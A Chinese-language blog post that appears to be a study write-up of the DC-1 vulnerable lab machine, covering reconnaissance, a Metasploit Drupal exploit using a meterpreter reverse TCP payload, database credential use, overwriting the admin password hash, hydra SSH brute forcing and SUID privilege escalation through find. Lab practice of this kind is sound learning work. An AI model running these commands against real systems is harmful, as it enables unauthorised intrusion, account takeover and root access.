---
title: DC-提权靶机
date: 2024-11-19 11:58:32
tags: web
categories: 省投测试
updated: 2024-11-19 11:58:32
---
# 简介
学习web怎么可以少了对靶机的攻击呢，渗透方向的学习必须要有靶机攻击的基础，前几天看到一篇文章发现DC系列正好可以来训练自己的水平和对工具的理解和使用

# 平台
攻击机 kali2024.3
靶机 DC系列

# 具体攻击
## DC-1

### 信息收集
#### 目标机ip
在利用ifconfig了解知道自己的ip为192.168.56.135后利用nmap扫描同网段存活主机
>nmap -sP 192.168.56.135/24
![](https://gitee.com/fogpost/photo/raw/master/202411191207141.png)

也可以利用arp-scan:
>arp-scan -l
![](https://gitee.com/fogpost/photo/raw/master/202411191209537.png)

获取到目标机ip为192.168.56.146

#### 端口扫描
>nmap -A 192.168.56.146，详细扫描了对应的服务和版本
![](https://gitee.com/fogpost/photo/raw/master/202411191211378.png)

#### 目标访问
我们发现存在80端口，利用web访问这个ip地址发现登录页面
![](https://gitee.com/fogpost/photo/raw/master/202411191214818.png)
利用目录扫描工具，查看这个ip的目录文件

### 指纹识别
利用whatweb工具识别web服务器的指纹，在火狐上面有个好用的工具叫做wapper，也可以查看对应的cms服务，不过可能需要网速比较快才好
>whatweb -v 192.168.56.146,扫描到主要的系统版本，服务号和php版本
![](https://gitee.com/fogpost/photo/raw/master/202411191219907.png)
wapper：
![](https://gitee.com/fogpost/photo/raw/master/202411191218063.png)
发现CMS为Drupal，版本为7

### 漏洞利用
发现cms便可以尝试一下msf来使用现成的攻击模块了

#### msfconsole获取session
>msfconsole ，利用search命令搜索cms的漏洞
search Drupal
![](https://gitee.com/fogpost/photo/raw/master/202411191223407.png)
发现序号为1的可以使用，我们完成设定好攻击模块的各个参数  
use 1  
show payloads
![](https://gitee.com/fogpost/photo/raw/master/202411191225109.png)
我们发现，这些payload和前面出现的tcp端口可能有关系所以选择payload为php/meterpreter/reverse_tcp  
set payload php/meterpreter/reverse_tcp  
show options
![](https://gitee.com/fogpost/photo/raw/master/202411191227042.png)
yes为必填大部分已经完成我们设计好攻击机ip，RHOSTS即可  
set rhosts 192.168.56.146  
exploit
![](https://gitee.com/fogpost/photo/raw/master/202411191229430.png)
执行完成获取session  

#### 获取shell登录sql
>获取DC-1的信息和shell，运用python反弹，获取更好的交互  
sysinfo shell   
python -c "import pty;pty.spawn('/bin/bash')"
![](https://gitee.com/fogpost/photo/raw/master/202411191233860.png)
ls+cat查看flag1
![](https://gitee.com/fogpost/photo/raw/master/202411191235094.png)
利用find . -name "set*"查找set文件
发现settings文件,查看文件，发现flag和数据库信息
![](https://gitee.com/fogpost/photo/raw/master/202411191237652.png)
使用数据库账户和密码来登录数据库
mysql -udbuser -pR0ck3t
![](https://gitee.com/fogpost/photo/raw/master/202411201642780.png)
show databases;查看数据库  
![](https://gitee.com/fogpost/photo/raw/master/202411201642468.png)  
use drupaldb; show tables;查看表,发现users表
![](https://gitee.com/fogpost/photo/raw/master/202411201644727.png)  
看表select * from users;看表结构desc users;  
发现name和pass列
![](https://gitee.com/fogpost/photo/raw/master/202411201646673.png)
![](https://gitee.com/fogpost/photo/raw/master/202411201647915.png)

#### 覆盖admin密码登录
>查看加密方式，搜索文件， find . -name "password*"\
![](https://gitee.com/fogpost/photo/raw/master/202411201651432.png)
查看password-hash.sh,发现为php加密文件，了解发现是使用 Drupal 的密码算法（基于 PBKDF2 和可配置的工作因子）生成一个加盐的安全哈希，没能力搞不懂我们用它来生成一个密码的哈希值，然后用这个哈希值去覆盖来登录
php  ./scripts/password-hash.sh  123456
![](https://gitee.com/fogpost/photo/raw/master/202411201656246.png)
hash: $S$Dyi0o5A9rq9O4imggBtz.INzLGWgqCjo67vC15JYgHjEVtkpdV/F
覆盖admin的密码  
mysql>update users set pass="$S$Dyi0o5A9rq9O4imggBtz.INzLGWgqCjo67vC15JYgHjEVtkpdV/F" where name="admin";
![](https://gitee.com/fogpost/photo/raw/master/202411201700729.png)
成功登录，之后再dashborad中发现falg3
![](https://gitee.com/fogpost/photo/raw/master/202411201700614.png)
![](https://gitee.com/fogpost/photo/raw/master/202411201701862.png)

#### 获取flag4，爆破密码
>查看etc/passwd,发现falg4的账户，查询falg4的home目录
![](https://gitee.com/fogpost/photo/raw/master/202411201702238.png)
，这次发现需要root目录，而且让我们爆破了
![](https://gitee.com/fogpost/photo/raw/master/202411201703822.png)
我们也有可能无法访问/home/flag4/flag4.txt，可以用hydra工具来爆破flag4的密码,发现密码是，orange
>hydra -l flag4 -P /usr/share/john/password.lst 192.168.56.146 ssh
![](https://gitee.com/fogpost/photo/raw/master/202411201709083.png)

### 提权
#### suid提权
查找一个属于root的拥有s权限的文件
- SUID(Set User ID)，SUID 可以让调用者以文件拥有者的身份运行该文件，所以我们利用 SUID 提权的思路就是运行 root 用户所拥有的 SUID 的文件，那么我们运行该文件的时候就得获得 root 用户的身份了。

常见的可用于 SUID 提权的文件有：
>find、bash、nmap、vim、more、less、nano、cp 
//当没有s权限时可以使用：chmod u+s 命令路径，增加权限

查找哪些命令具备 SUID 标识
>find / -perm -4000 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
 
发现find文件
![](https://gitee.com/fogpost/photo/raw/master/202411201714007.png)  
使用find文件来提权：  
利用 find 命令随便查找一个正确的文件（夹）路径，后面加上 -exec shell 命令 \;  
提权 /bin/bash 或者 /bin/sh
![](https://gitee.com/fogpost/photo/raw/master/202411201717565.png)
最后完成flag获取
![](https://gitee.com/fogpost/photo/raw/master/202411201719543.png)

# 总结
DC-1虽然还是比较简单，但是流程也比较长在此做一个总结，DC-1靶机主要考察了信息收集、漏洞利用、权限提升、提权等基本知识。
数据库的操作，suid提权，hydra爆破ssh端口，这些都是我之前没有接触过的跟着流程走一边还是挺好的